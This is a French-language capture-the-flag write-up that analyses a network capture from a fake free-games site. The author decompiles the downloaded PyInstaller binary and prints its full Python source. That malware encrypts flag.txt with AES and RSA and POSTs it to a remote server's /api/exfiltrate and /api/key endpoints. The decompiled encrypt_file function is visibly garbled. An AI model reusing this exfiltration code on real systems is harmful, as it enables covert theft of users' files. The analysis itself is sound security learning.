# challenge_name
### image ou challenge desc

## 1. Il se passe quoi en gros ?

On commence le challenge avec l’accès à 2 choses, une instance Docker qui mène à une 404 quand on l’ouvre, je suppose donc que ça sera utile plus tard, et surtout un fichier de capture réseau `capture.pcap`. 

![image.png](https://github.com/CreaTikaa/CTFs-Writeups/blob/main/Malweirb/screenshots/screen1.png)

La capture n’est pas très grande, seulement 452 paquets. On jette un coup d’oeil aux statistiques pour avoir une vue d’ensemble de qui parle avec qui et comment.

![image.png](https://github.com/CreaTikaa/CTFs-Writeups/blob/main/Malweirb/screenshots/screen2.png)

Tout les traffic est entre deux hosts, l’auteur de la capture et 127.1.10.56, donc tout ce passe sur la même machine. On va donc ignorer les IPs pour le moment sans chercher plus loin, et plutôt ce concentrer sur le traffic pour voir qu’est ce que ce fameux Minecraft gratuit à ramené avec lui. 

On filtre donc la capture sur http pour voir les échanges entre l’host et ce super site qui nous permet de jouer à Minecraft, ce qui nous laisse avec 20 paquets visibles. On analyse un peu ce qu’il ce passe en regardant le TCP Stream. 

Le traffic est lisible assez facilement : 

```html
<!DOCTYPE html>
<html>
<head>
    <title>Browse Games - FreeGames</title>
    <style>
<plein de css, je coupe pour pas faire trop long>
    </style>
</head>
<body>
    <div class="nav">
        <a href="/">.... Home</a>
        <a href="/about">.... About</a>
        <a href="/faq">... FAQ</a>
    </div>
    
    <h1>.... Available Games</h1>
    
    <div class="games-grid">
        
        <div class="game-card">
            <h3>.... Cyberpunk 2077 - Cracked</h3>
            <div class="game-info">
                <p><strong>Size:</strong> 70 GB</p>
                <p><strong>Description:</strong> Latest version with all DLCs! 100% working!</p>
            </div>
            <div class="button-group">
                <a href="/games/1/download" class="btn btn-download">...... Download</a>
            </div>
        </div>
        
        <div class="game-card">
            <h3>.... GTA VI - Beta Leaked</h3>
            <div class="game-info">
                <p><strong>Size:</strong> 120 GB</p>
                <p><strong>Description:</strong> EXCLUSIVE! Download before it gets taken down!</p>
            </div>
            <div class="button-group">
                <a href="/games/2/download" class="btn btn-download">...... Download</a>
            </div>
        </div>
        
        <div class="game-card">
            <h3>.... Minecraft - Premium Account Generator</h3>
            <div class="game-info">
                <p><strong>Size:</strong> 5 GB</p>
                <p><strong>Description:</strong> Generate unlimited premium accounts! No survey!</p>
            </div>
            <div class="button-group">
                <a href="/games/3/download" class="btn btn-download">...... Download</a>
            </div>
        </div>
        
    </div>
</body>
</html>
    
```

On voit donc un site qui semble nous présenter de multiples jeux gratuits à disposition, 

Notre utilisateur se dirige donc sur la page d’installation : 

```html
<!DOCTYPE html>
<html>
<head>
    <title>Installation Guide - Minecraft - Premium Account Generator</title>
[...]
</head>
<body>
    <h1>.... Installation Guide</h1>
     [...]
    <div class="warning-box">
        <h3>CRITICAL WARNING</h3>
        <p>
            <strong>If Windows Defender blocks the download, just click 'Run Anyway'.</strong> 
            It's completely safe! .......
        </p>
        <p>
            Windows often flags cracked games as threats, but this is a 
            <span class="highlight">FALSE POSITIVE</span>. 
            Our files are 100% clean and tested!
        </p>
    </div>
    <h2>Step-by-Step Installation</h2>
    <div class="steps-container">
            <span class="highlight">Disable your antivirus</span> completely 
                (it will flag the crack as a false positive!)
            </span>
        </div>
        <div class="step">
                Run the installer <span class="highlight">as Administrator</span>
                (Right-click ... Run as Administrator)
            </span>
        </div>
            <span class="step-text">
                Don't forget to seed if using torrents!
                 *# ça c'est bien vrai par contre*
            </span>
        </div>
    </div>
  [...]
        <a href="/games/3/download" class="download-btn">
           DOWNLOAD MINECRAFT - PREMIUM ACCOUNT GENERATOR - Size: 5 GB 
        </a>
            
    </div>
  </div>
</body>
</html>
```

On y voit donc des conseils super importants à suivre, (et un peu bizarre quand même) pour installer ce truc, c’est étrange j’ai l’impression que va falloir reverse ce truc dans quelques minutes. ^^

Bon du coup on continue de regarder, et il download évidemment un truc un peu bizarre. Mais ce qui est le plus intéréssants, c’est qu’après le download du “jeu” il y a ça : 

![image.png](https://github.com/CreaTikaa/CTFs-Writeups/blob/main/Malweirb/screenshots/image.png)

Il y à 3 rêquetes `GET` à des endpoints un peu spéciaux, `/api/pubkey` qui récupère une clé publique, `/api/exfiltrate` et `/api/key` . Très étrange tout ça. 

Pour avoir une vue d’ensemble de ce qu’il ce passe : 

![image.png](https://github.com/CreaTikaa/CTFs-Writeups/blob/main/Malweirb/screenshots/screen3.png)

En bleu, l’host se balade un peu sur le site ce qui nous donne des infos sur ce qu’il fait, puis en rouge il download le “jeu” et notre flag (qui ce fait chiffrer en même temps) avec. 

## 2. On analyse les trucs bizarres

J’extrait donc tout les objets HTTP de la capture avec Wireshark, et je me retrouve avec ça : 

![image.png](https://github.com/CreaTikaa/CTFs-Writeups/blob/main/Malweirb/screenshots/screen4.png)

On regarde un peu ce qu’il y à dedans : 

```jsx
❯ cat key\(1\)
{"status":"success","message":"Key received and stored"}%

❯ cat exfiltrate\(1\)
{"status":"success","message":"File flag.txt.enc received","size":48}%
```

```jsx
❯ cat key
{"encrypted_key": "WL2NZQtodYiBf6iCmgAHJ8y7J7v+2j1AQoIUPNT6A4nIOfEmOKOgJ0XXquCm7VhN9WpEo2mDNt5mRYt/Uxklhbg8fEMKENilJLlPG/x2tDZkNHti0iqvg5ZvsvxXvKOf09lWMvG9zwnr0tm+Nh8XC3MIIzhYVIGIbGJNWYMqJWiwlhnO4mEopMUUf2P7XN09QZf0Xb8uvvL3sRbaCHIdrD/DRJw8ZBzxRsorNcl9Xxwc1BYTDH+UdtF/RtZhTx/pJ7+zdfpszQ7aQX8Bl0VwAJ8md/Aq5LK/DxXDmqQUcRfEkwlWN/V8oy15th6k4nXs3U8f3oUheMjK0SdqXCwGMA==", "iv": "j+GePVY9lRJ096mCnnZQfw==", "filename": "flag.txt"}%
                                                                                                                                                                    
❯ cat pubkey
{"public_key":"LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxKzBqaVE3OFUzUjVUVkl4aVE3UgpqNUpIemNIZGtzL21WYi9IS05uQXlTVHVNRWJGbGd5N2RzOWlpTldDRStVWTNVcHRwMDhscTZLTFlkQnhkcDY3CmJYU2o5NXN6OTlXazBjT1Q4ekRIa2VMWm8yNkZVM3Q1Y1VnRVVkdStiMXVZME05NUhZcVBEeDdkb3c2QXJHVjIKZWRxOXZHM2ZqTXlYYXJBd2xVYnd5ZjJ2R0sza1JRU3lIYlBTUHpxVnZkOFRJelZ5bnQxTEJLNS9GN0VYT2QzSQpsT3FtQytiZHhaZXBDQXYvQUF2UTlMUmx0THZNYUlwSlVuNC9pdUYrZTc2VHYzQUg3ZVhwcUIrVzBaRkw1Z2FBCllJOS96UGJ1WmtZakRIN210YUJtMXVva01tbU9CbHBzN2ZTWjBsM0RhYTFtTk5vZ09IWHc3NTlFRitMN3djaDcKVHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=="}%
```

Tout correspond bien à ce qu’on a remarqué dans le pcap. Pendant le download du “Minecraft”, la machine reçoit aussi un fichier `flag.txt.enc` qui est chiffré (c’est le `exfiltrate` sur le screen). Avec ça, on à donc l’`encrypted_key`, `l’iv` , et la clé publique qui ont tout les 3 servis à chiffrer le flag. Mais on ne peut pas encore déchiffrer flag.txt.enc en flag.txt avec ça, il nous faut la clé privée qui va avec la publique pour ce faire. 

## 3. Ouais mais du coup il se passe quoi pour DE VRAI ?

On va donc continuer en regardant ce qu’il ce passe dans `download`, qui est, très probablement un malware, si on est sérieux 2 minutes. 

![image.png](https://github.com/CreaTikaa/CTFs-Writeups/blob/main/Malweirb/screenshots/screen6.png)

C’est bien un binaire, par habitude je lance un strings dessus pour voir si je peux chopper des informations rapidement. Et en lisant l’output, je tombe sur des trucs un peu particulier : 

(tout était pas à côté j’ai évidemment cut pour la lisibilité)

```
❯ strings download 
pyi-python-flag
%s/python%d.%d/lib-dynload
Failed to set python home path: %s
Failed to pre-initialize embedded python interpreter!
Failed to set python home path!
Failed to allocate PyConfig structure! Unsupported python version?
Failed to start embedded python interpreter: %s
Failed to start embedded python interpreter!
blibpython3.12.so.1.0
bpython3.12/lib-dynload/_bz2.cpython-312-x86_64-linux-gnu.so
bpython3.12/lib-dynload/_codecs_cn.cpython-312-x86_64-linux-gnu.so
bpython3.12/lib-dynload/_codecs_hk.cpython-312-x86_64-linux-gnu.so
bpython3.12/lib-dynload/_codecs_iso2022.cpython-312-x86_64-linux-gnu.so
bpython3.12/lib-dynload/_codecs_jp.cpython-312-x86_64-linux-gnu.so
bpython3.12/lib-dynload/_codecs_kr.cpython-312-x86_64-linux-gnu.so
bpython3.12/lib-dynload/_codecs_tw.cpython-312-x86_64-linux-gnu.so
bpython3.12/lib-dynload/_contextvars.cpython-312-x86_64-linux-gnu.so
bpython3.12/lib-dynload/_decimal.cpython-312-x86_64-linux-gnu.so
bpython3.12/lib-dynload/_hashlib.cpython-312-x86_64-linux-gnu.so
bpython3.12/lib-dynload/_lzma.cpython-312-x86_64-linux-gnu.so
bpython3.12/lib-dynload/_multibytecodec.cpython-312-x86_64-linux-gnu.so
bpython3.12/lib-dynload/resource.cpython-312-x86_64-linux-gnu.so
8libpython3.12.so.1.0
```  

Tiens, tiens, tiens. C’est du Python, pas du C. Mais du coup, il faut reverse du Python ? 
Bah ouais. Et j’ai aucune idée de comment on fait ça, donc je me renseigne. Après un peu de recherche, je trouve un tool qui m’a l’air bien sympa :    

https://github.com/extremecoders-re/pyinstxtractor. Il va nous permettre de transformer le binaire en de multiples `.pyc`. Mais d’ailleurs, c’est quoi un .pyc même ? Un fichier **.pyc** c’est un fichier Python compilé qui contient du **bytecode**, c’est-à-dire une représentation de bas niveau de code source Python. 

![image.png](https://github.com/CreaTikaa/CTFs-Writeups/blob/main/Malweirb/screenshots/screen7.png)

Et il s’avère que depuis un `.pyc` on peut utiliser un outils spécifique ou simplement le site https://pylingual.io/ (Merci à la membre du staff pour le tips !!) et on obtient le code source. Donc vous le voyez très bien ce `malware.pyc` juste au dessus la non ? Et bien voici le code à l’intérieur : 

```python
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: malware.py
# Bytecode version: 3.12.0rc2 (3531)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import requests
import base64
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.padding import PKCS7
SERVER_URL = 'http://127.1.10.56:3695'

def get_server_pub_key():
    """Retrieve the server\'s public RSA key"""  # inserted
    try:
        response = requests.get(f'{SERVER_URL}/api/pubkey', timeout=5)
        if response.status_code == 200:
            data = response.json()
            pem_data = base64.b64decode(data['public_key'])
            public_key = serialization.load_pem_public_key(pem_data, backend=default_backend())
            return public_key
    except Exception as e:
        raise f'Error fetching public key: {e}'

def set_encryption_key(public_key):
    """Generate random AES key and IV, encrypt key with RSA"""  # inserted
    try:
        aes_key = os.urandom(32)
        iv = os.urandom(16)
        encrypted_key = public_key.encrypt(aes_key, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
        return (aes_key, iv, encrypted_key)
    except Exception as e:
        raise f'Error setting encryption key: {e}'

def encrypt_file(filepath, key, iv):
    """Encrypt file using symetric AES-256-CBC"""  # inserted
    try:
        with open(filepath, 'rb') as f:
            pass  # postinserted
    except Exception as e:
            plaintext = f.read()
                padder = PKCS7(128).padder()
                padded_data = padder.update(plaintext) + padder.finalize()
                cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
                encryptor = cipher.encryptor()
                ciphertext = encryptor.update(padded_data) + encryptor.finalize()
                return ciphertext
            raise f'Error encrypting file: {e}'

def exfiltrate_file(encrypted_data, filename):
    """Send encrypted file to server which store it and it\'s encrypted key"""  # inserted
    try:
        files = {'file': (f'{filename}.enc', encrypted_data, 'application/octet-stream')}
        response = requests.post(f'{SERVER_URL}/api/exfiltrate', files=files, timeout=10)
        return response.status_code == 200
    except Exception as e:
        raise f'Error exfiltrating file: {e}'
    else:  # inserted
        pass

def send_encryption_key(encrypted_key, iv, filename):
    """Send encrypted AES key to server"""  # inserted
    try:
        data = {'encrypted_key': base64.b64encode(encrypted_key).decode('utf-8'), 'iv': base64.b64encode(iv).decode('utf-8'), 'filename': filename}
        response = requests.post(f'{SERVER_URL}/api/key', json=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        raise f'Error sending key: {e}'

def main():
    """Main malware execution flow"""  # inserted
    target_file = 'flag.txt'
    print('[*] Starting exfiltration process...')
    print('[*] step1: Fetching server public key...')
    pub_key = get_server_pub_key()
    if not pub_key:
        print('[!] Failed to get server public key')
    print('[*] step2: Generating encryption keys...')
    aes_key, iv, encrypted_aes_key = set_encryption_key(pub_key)
    if not aes_key:
        print('[!] Failed to generate encryption key')
    print(f'[*] step3: Encrypting {target_file}...')
    encrypted_data = encrypt_file(target_file, aes_key, iv)
    if not encrypted_data:
        print('[!] Failed to encrypt file')
    print('[*] step4: Exfiltrating encrypted file...')
    if exfiltrate_file(encrypted_data, target_file):
        print('[+] File successfully exfiltrated')
    else:  # inserted
        print('[!] Exfiltration failed')
    print('[*] step5: Sending encryption key to server...')
    if send_encryption_key(encrypted_aes_key, iv, target_file):
        print('[+] Key successfully sent')
    else:  # inserted
        print('[!] Failed to send key')
if __name__ == '__main__':
    main()
```

En gros, ce script est un malware (ah bon?) d’exfiltration chiffrée combinant de l’encryption RSA + AES.

Comment ça marche : 

1. Le malware contact [`http://127.1.10.56:3695/api/pubkey`](http://127.1.10.56:3695/api/pubkey) , ici il récupère sa clé publique RSA encodée en B64. 
2. Ensuite, il gen une clé AES256 `os.urandom(32)`  et un IV de 16 octets (La clé AES est chiffrée avec RSA-OAEP (SHA-256))
3. Pour continuer, il chiffre donc le fichier `flag.txt` avec AES-256-CBC et un padding PKCS7 (bloc 128) ce qui donne `flag.txt.enc`. 
4. Il nous envoi donc ce fichier via un `POST`  sur `/api/exfiltrate`
5. Et il fini par un envoi via un autre `POST`  sur `/api/key` cette fois de la clé AES chiffré, de l’IV et du nom du fichier. 

## 4. Et donc, il est ou le flag la ?

Maintenant on comprend mieux comment tout ça fonctionne, et notre objectif est donc d’obtenir la clé privée stockée uniquement sur le serveur qui à envoyé le malware pour pouvoir déchiffrer le contenu du flag. On sait que la clé est envoyé sur `/api/key` avec un `POST`.  
Donc en vrai, on pourrait pas juste demander au serveur de gentillemment nous refiler la clé ? Peut être. Sauf que l’ip du serveur c’est du [localhost](http://localhost) la, donc ça va être compliqué. Mais vous vous rappelez de l’instance Docker donc on à parler au début ? Maintenant tout devient clair. 

Un petit GET sur `<p:port> /api/key` et on obtient ce super résultat : 

```jsx
[{"status":"success","filename":"flag.txt.key","key":"sXKwMiEF46vfyVweP90YurEUNsWubYpC7/l0SBJs4XY=","iv":"j+GePVY9lRJ096mCnnZQfw=="}]
```

Bon, bah voila. On l’a cette clé. Maintenant il suffit plus qu’a déchiffrer le fichier

```jsx
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key_b64 = "sXKwMiEF46vfyVweP90YurEUNsWubYpC7/l0SBJs4XY="
iv_b64  = "j+GePVY9lRJ096mCnnZQfw=="

key = base64.b64decode(key_b64)
iv = base64.b64decode(iv_b64)

with open("exfiltrate", "rb") as f:
    ciphertext = f.read()

cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)

print(plaintext.decode())
```

## FLAAAAAAAAAAAAAAAAAAAAAG !!!

![image.png](https://github.com/CreaTikaa/CTFs-Writeups/blob/main/Malweirb/screenshots/screen7.png)
